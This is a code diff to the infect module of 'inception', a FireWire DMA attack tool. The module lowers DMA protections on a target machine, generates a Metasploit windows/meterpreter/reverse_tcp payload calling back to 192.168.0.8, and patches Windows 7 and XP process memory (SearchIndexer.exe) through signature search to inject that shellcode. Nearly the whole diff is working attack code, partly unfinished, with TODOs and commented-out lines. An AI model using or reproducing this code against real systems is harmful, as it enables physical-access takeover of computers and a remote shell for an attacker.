@@ -23,7 +23,7 @@ Created on Dec 5, 2013
 '''
 from inception import firewire, cfg, term, util
 from inception.screenlock import list_targets, select_target, searchanddestroy, patch
-from inception.memory import Signature
+from inception.memory import Target, Signature, Chunk, MemorySpace
 from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfRpcError, PayloadModule
 from inception.external.pymetasploit.metasploit.msfconsole import MsfRpcConsole
 
@@ -46,7 +46,59 @@ class InfectSignature(collections.namedtuple('InfectSignature',
     '''
     pass
 
+patches = {
+    'alloc_page': 
+    '\x01'
+}
+
+target = Target(
+    name='Allocate page',
+    note='Create and jump to page target',
+    signatures=[
+        Signature(
+            offsets=[0x18c],
+            chunks=[
+                Chunk(
+                    chunk=0x8bff558bec813D,
+                    chunkoffset=0,
+                    patch=patches['alloc_page'],
+                    patchoffset=0)
+                ],
+            os='Windows 7',
+            os_versions=['SP0'],
+            os_architectures=['x86'],
+            executable='SearchIndexer.exe',
+            version='',
+            md5='',
+            tag=False)
+        ])
+
 def run():
+
+    # Initialize
+    # TODO: externalize this
+    if not cfg.filemode:
+        try:
+            fw = firewire.FireWire()
+        except IOError:
+            term.fail('Could not initialize FireWire. Are the modules ' +
+                      'loaded into the kernel?')
+        start = time.time()
+        device_index = fw.select_device()
+
+    # Lower DMA shield or use a file as input, and set memsize
+    device = None
+    memsize = None
+    if cfg.filemode:
+        device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
+        memsize = os.path.getsize(cfg.filename)
+    else:
+        elapsed = int(time.time() - start)
+        device = fw.getdevice(device_index, elapsed)
+        memsize = 2 * cfg.GiB
+
+    # Create memory space
+    memspace = MemorySpace(device, memsize)
 
     # Connect to msf and generate shellcode(s)
     try:
@@ -55,7 +107,7 @@ def run():
         term.fail(e)
 
     term.poll('What payload module would you like to infect the host with?')
-    name = 'windows/shell/bind_tcp' #input()
+    name = 'windows/meterpreter/reverse_tcp' #input()
     try:
         module = PayloadModule(client, name)
     except MsfRpcError as e:
@@ -64,30 +116,35 @@ def run():
     
     # term.poll('Options:')
     # options = {'LHOST': 'localhost'}
-    module['RHOST'] = '192.168.0.5'
+    module['LHOST'] = '192.168.0.8'
     # module['ForceEncode'] = False
     # module['-t'] = 'raw'
-    opts = {'ForceEncode': False}
+    # opts = {'ForceEncode': False}
     try:
         payload = module.execute(Encoder='generic/none').get('payload') # **{'-t': 'raw'}
     except MsfRpcError as e:
         term.fail(e)
 
-    for o in module.options:
-        print('{0}: {1}'.format(o, module[o]))
-    print('---')
+    needed = [x for x in module.required if x not in module.advanced]
     for o in module.advanced:
         print('{0}: {1}'.format(o, module[o]))
     print('---')
-    for o in module.runoptions:
+    for o in module.required:
         print('{0}: {1}'.format(o, module[o]))
     print('---')
-    print(payload)
-    print(util.bytes2hexstr(payload))
+    for o in needed:
+        print('{0}: {1}'.format(o, module[o]))
+    # print(payload)
+    # print(util.bytes2hexstr(payload))
+
+    # TODO: Allow users to set required options
 
     # Search for signature
+    found = memspace.find(target)
+    print(target)
 
     # Figure out what os & architecture we're attacking and select stage
+
 
     # Copy off original memory content in the region where stage 1 will be written
 
@@ -143,7 +200,7 @@ def run():
     #                                     'patchoffset': 0x00}]}]}
 
     # Works except for network connection - best shot so far
-    target = {'OS': 'Windows 7',
+    t = {'OS': 'Windows 7',
             'versions': ['SP1'],
             'architectures': ['x86'],
             'name': 'SearchIndexer.exe',
@@ -360,7 +417,7 @@ def run():
     # Perform parallel search for all signatures for each OS at the known 
     # offsets
     term.info('DMA shields should be down by now. Attacking...')
-    address, chunks = searchanddestroy(device, target, memsize)
+    address, chunks = searchanddestroy(device, t, memsize)
     if not address:
         # TODO: Fall-back sequential search?
         return None, None
@@ -398,7 +455,7 @@ def run():
     #--------------Exit thread, works on XP, no 7------------------#
     # Exitfunc until vista: E01D2A0A
     # Exitfunc from vista: 4713726F
-    target = {'OS': 'Windows XP',
+    t = {'OS': 'Windows XP',
             'versions': ['SP1'],
             'architectures': ['x86'],
             'name': 'signature',
@@ -465,7 +522,7 @@ def run():
     # Perform parallel search for all signatures for each OS at the known 
     # offsets
     term.info('DMA shields should be down by now. Attacking...')
-    address2, chunks = searchanddestroy(device, target, memsize)
+    address2, chunks = searchanddestroy(device, t, memsize)
     if not address:
         # TODO: Fall-back sequential search?
         return None, None
